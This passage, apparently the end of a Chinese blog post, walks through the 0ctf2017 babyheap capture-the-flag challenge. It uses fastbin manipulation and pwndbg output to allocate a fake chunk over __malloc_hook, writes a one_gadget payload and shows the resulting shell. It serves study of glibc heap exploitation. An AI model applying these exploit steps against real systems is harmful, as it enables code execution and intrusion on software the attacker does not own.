<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x7f9c3e9d4000+0x399acd</span><br><span class="line">0x7f9c3ed6dacd &lt;_IO_wide_data_0+301&gt;:	0x9c3ed69f00000000	0x000000000000007f</span><br><span class="line">0x7f9c3ed6dadd:	0x9c3ea50420000000	0x9c3ea503c000007f</span><br><span class="line">0x7f9c3ed6daed &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f9c3ed6dafd:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f9c3ed6db0d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f9c3ed6db1d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f9c3ed6db2d &lt;main_arena+45&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f9c3ed6db3d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f9c3ed6db4d &lt;main_arena+77&gt;:	0x0000000000000000	0xc4480921a0000000</span><br><span class="line">0x7f9c3ed6db5d &lt;main_arena+93&gt;:	0x0000000000000055	0xc448092080000000</span><br></pre></td></tr></table></figure>
<p>利用fast bin机制进行如下构造，我们需要申请到fake_chunk的位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">code:</span><br><span class="line">malloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line">fill(2,p64(fake_chunk)) # chunk[2]-&gt;fd = fake chunk</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x55c448092080 —▸ 0x7f9c3ed6dacd (_IO_wide_data_0+301) ◂— 0x9c3ea50420000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55c4480920f0 —▸ 0x7f9c3ed6db58 (main_arena+88) ◂— 0x55c4480920f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>继续malloc两次即可申请到fake chunk的地方，就可以对malloc_hook进行写入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">code:</span><br><span class="line">malloc(0x60)</span><br><span class="line">malloc(0x60) # malloc fake chunk</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x9c3ea50420000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55c4480920f0 —▸ 0x7f9c3ed6db58 (main_arena+88) ◂— 0x55c4480920f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>最后我们构造fake chunk，写入one_gadget即可，这里根据自己的libc版本查询相应的one_gadget</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># construct fake chunk</span><br><span class="line">payload = p8(0)*3</span><br><span class="line">payload += p64(0)*2</span><br><span class="line">payload += p64(libc_base+0x3f35a) # one_gadgets</span><br><span class="line">fill(6, payload)</span><br><span class="line"></span><br><span class="line"># trigger</span><br><span class="line">malloc(255)</span><br></pre></td></tr></table></figure>
<p>最后getshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;ls\n&apos;</span><br><span class="line">[DEBUG] Received 0x2f bytes:</span><br><span class="line">    &apos;0ctfbabyheap  core  exp.py  libc.so.6\n&apos;</span><br><span class="line">0ctfbabyheap  core  exp.py  libc.so.6</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    &apos;whoami\n&apos;</span><br><span class="line">[DEBUG] Received 0x8 bytes:</span><br><span class="line">    &apos;thunder\n&apos;</span><br><span class="line">thunder</span><br></pre></td></tr></table></figure>
<p><strong>总结</strong></p>
<p>这道题目因为可以自己构造堆的结构，所以比较自由，利用的方法也非常多，我的exp是针对我的deepin环境，想要在不同平台进行利用，需要查看自己libc中的偏移，修改部分偏移即可，一些知识点总结如下</p>
<ol>
<li>保护全开可以覆写malloc_hook，free_hook等函数</li>
<li>small chunk泄露fd和bk，从而泄露libc的手法</li>
<li>堆溢出的前提下对fast bin检查机制的一些绕过手法</li>
</ol>

      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Linux-Pwn/" rel="tag"><i class="fa fa-tag"></i> Linux Pwn</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/08/19/www漏洞从win7-win10/" rel="next" title="www漏洞从win7-win10">
                <i class="fa fa-chevron-left"></i> www漏洞从win7-win10
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/03/21/CVE-2019-1458-从-漏洞报告-到POC的编写过程/" rel="prev" title="CVE-2019-1458: 从'漏洞报告'到POC的编写过程">
                CVE-2019-1458: 从'漏洞报告'到POC的编写过程 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Thunder_J</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives">
                
                    <span class="site-state-item-count">18</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">15</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">14</span>
                    <span class="site-state-item-name">标签</span>
                  </a>
                </div>
              
            </nav>
          

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/ThunderJie" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://www.zhihu.com/people/thunder-j/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-compass"></i>知乎</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://blog.csdn.net/CharlesGodX/" target="_blank" title="csdn"><i class="fa fa-fw fa-copyright"></i>csdn</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://twitter.com/ThunderJ17" target="_blank" title="Twitter"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                  
                </span>
              
            </div>
          

          
          

          
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00：Introduction"><span class="nav-number">1.</span> <span class="nav-text">0x00：Introduction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01：Stack-Attack"><span class="nav-number">2.</span> <span class="nav-text">0x01：Stack Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00：DynELF"><span class="nav-number">2.1.</span> <span class="nav-text">0x00：DynELF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01：Jarvis-Oj-level4"><span class="nav-number">2.1.1.</span> <span class="nav-text">0x01：Jarvis Oj-level4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02：exp"><span class="nav-number">2.1.2.</span> <span class="nav-text">0x02：exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03：总结"><span class="nav-number">2.1.3.</span> <span class="nav-text">0x03：总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01：Ret2dl-resovle"><span class="nav-number">2.2.</span> <span class="nav-text">0x01：Ret2dl-resovle</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01：例子"><span class="nav-number">2.2.1.</span> <span class="nav-text">0x01：例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02：总结"><span class="nav-number">2.2.2.</span> <span class="nav-text">0x02：总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02：Heap-Attack"><span class="nav-number">3.</span> <span class="nav-text">0x02：Heap Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Glibc-Heap"><span class="nav-number">3.1.</span> <span class="nav-text">Glibc Heap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#堆定义"><span class="nav-number">3.1.1.</span> <span class="nav-text">堆定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#堆相关数据结构"><span class="nav-number">3.1.2.</span> <span class="nav-text">堆相关数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#malloc-chunk"><span class="nav-number">3.1.2.1.</span> <span class="nav-text">malloc_chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Allocated-chunk"><span class="nav-number">3.1.2.2.</span> <span class="nav-text">Allocated chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Freed-chunk"><span class="nav-number">3.1.2.3.</span> <span class="nav-text">Freed chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#malloc大小计算"><span class="nav-number">3.1.2.4.</span> <span class="nav-text">malloc大小计算</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lab"><span class="nav-number">3.1.2.5.</span> <span class="nav-text">lab</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#main-arena"><span class="nav-number">3.1.2.6.</span> <span class="nav-text">main_arena</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Top-chunk"><span class="nav-number">3.1.2.7.</span> <span class="nav-text">Top chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Last-Remainder-Chunk"><span class="nav-number">3.1.2.8.</span> <span class="nav-text">Last Remainder Chunk</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-amp-free"><span class="nav-number">3.1.3.</span> <span class="nav-text">malloc &amp; free</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Fast-bin"><span class="nav-number">3.1.3.1.</span> <span class="nav-text">Fast bin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Unsorted-bin"><span class="nav-number">3.1.3.2.</span> <span class="nav-text">Unsorted bin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Small-bin"><span class="nav-number">3.1.3.3.</span> <span class="nav-text">Small bin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Large-bin"><span class="nav-number">3.1.3.4.</span> <span class="nav-text">Large bin</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检查机制"><span class="nav-number">3.1.4.</span> <span class="nav-text">检查机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#free-check"><span class="nav-number">3.1.4.1.</span> <span class="nav-text">free check</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Check-In-Glbc"><span class="nav-number">3.1.4.2.</span> <span class="nav-text">Check In Glbc</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">3.1.5.</span> <span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-After-Free"><span class="nav-number">3.2.</span> <span class="nav-text">Use After Free</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Example-One"><span class="nav-number">3.2.1.</span> <span class="nav-text">Example One</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Example-Two"><span class="nav-number">3.2.2.</span> <span class="nav-text">Example Two</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Free"><span class="nav-number">3.3.</span> <span class="nav-text">Double Free</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Example-One-1"><span class="nav-number">3.3.1.</span> <span class="nav-text">Example One</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Example-Two-1"><span class="nav-number">3.3.2.</span> <span class="nav-text">Example Two</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Heap-Overflow"><span class="nav-number">3.4.</span> <span class="nav-text">Heap Overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Example-One-2"><span class="nav-number">3.4.1.</span> <span class="nav-text">Example One</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Example-Two-2"><span class="nav-number">3.4.2.</span> <span class="nav-text">Example Two</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Off-By-One"><span class="nav-number">3.5.</span> <span class="nav-text">Off-By-One</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#init-proc"><span class="nav-number">3.5.1.</span> <span class="nav-text">init_proc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#alloc-note"><span class="nav-number">3.5.2.</span> <span class="nav-text">alloc_note</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#edit-note"><span class="nav-number">3.5.3.</span> <span class="nav-text">edit_note</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delete-note"><span class="nav-number">3.5.4.</span> <span class="nav-text">delete_note</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#backdoor"><span class="nav-number">3.5.5.</span> <span class="nav-text">backdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路"><span class="nav-number">3.5.6.</span> <span class="nav-text">思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Some-Example"><span class="nav-number">3.6.</span> <span class="nav-text">Some Example</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0ctf2017-babyheap"><span class="nav-number">3.6.1.</span> <span class="nav-text">0ctf2017 babyheap</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright"> &copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Thunder_J</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
    <span title="站点总字数">645k</span>
  

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    
    <span title="站点阅读时长">9:47</span>
  
</div>




  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.4.2</div>




<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:
  <span id="busuanzi_value_site_uv"></span>
  人
</span>
</div>

<span id="busuanzi_container_site_pv">
    总访问量
    <span id="busuanzi_value_site_pv"></span>
    次
</span>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  

  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.4.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.4.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.4.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.2"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.2"></script>



  



  










  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  

  
  

  

  

  

  

  

</body>
</html>

<!-- ҳ����С���� -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>